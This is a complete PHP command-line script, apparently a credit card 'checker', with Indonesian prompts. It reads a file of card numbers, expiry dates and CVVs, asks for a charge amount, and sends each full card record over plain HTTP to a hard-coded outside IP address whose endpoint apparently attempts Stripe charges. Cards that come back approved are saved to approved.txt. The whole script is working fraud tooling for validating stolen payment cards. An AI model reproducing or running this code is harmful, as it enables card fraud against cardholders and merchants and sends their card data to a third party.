<?php
ini_set("memory_limit", "-1");
date_default_timezone_set("Asia/Jakarta");
define("OS", strtolower(PHP_OS));

require_once('class/zebra.php');

$curl = new Zebra_cURL();

echo "\033[31m _    ___          ___    _             _____ _    _ ______ _____ _  ________ _____  
| |  | \ \        / / |  | |           / ____| |  | |  ____/ ____| |/ /  ____|  __ \ 
| |  | |\ \  /\  / /| |  | |  ______  | |    | |__| | |__ | |    | ' /| |__  | |__) |
| |  | | \ \/  \/ / | |  | | |______| | |    |  __  |  __|| |    |  < |  __| |  _  / 
| |__| |  \  /\  /  | |__| |          | |____| |  | | |___| |____| . \| |____| | \ \ 
 \____/    \/  \/    \____/            \_____|_|  |_|______\_____|_|\_\______|_|  \_\ \033[0m \n\n";

awal:
echo "CC List (ex: cc.txt ) : ";
$fileakun = trim(fgets(STDIN));

if(empty(file_get_contents($fileakun)))
{
    print "CC List Tidak Ditemukan..".PHP_EOL;
    goto awal;
}
custom:
echo "Custom Charge ( ex : 1 ) : $";
$amount = trim(fgets(STDIN));

if($amount < 1)
{
    print "Minimal $1.00 ..".PHP_EOL;
    goto custom;
}
print PHP_EOL."Total : ".count(explode("\n", str_replace("\r","",file_get_contents($fileakun))))." CC".PHP_EOL;

$no = 1;
foreach(explode("\n", str_replace("\r", "", file_get_contents($fileakun))) as $c => $cce)
{   

    $pecah = explode("|", trim($cce));
    $ccnum=trim($pecah[0]);
    $month=trim($pecah[1]);
    $year=trim($pecah[2]);
    $cvv=trim($pecah[3]); 
    $format = "$ccnum|$month|$year|$cvv";

$curl->get(array(
 
    'http://104.248.200.73/api/stripe.php?cc='.$format.'&amount='.$amount,
 
), function($result) {

        $awe = json_decode($result->body);
        
        if($awe->status == "APPROVED"){
            $bin = $awe->bin;
            $simpan =fopen('approved.txt', 'a');
            fwrite($simpan, "APPROVED => $awe->format $bin \n");    
            echo "\033[32mAPPROVED => $awe->format $bin \033[0m \n";
        } else {
            $msg = $awe->reason;
            echo "\033[31mDECLINED => $awe->format REASON : $msg\033[0m \n";
        }
});

}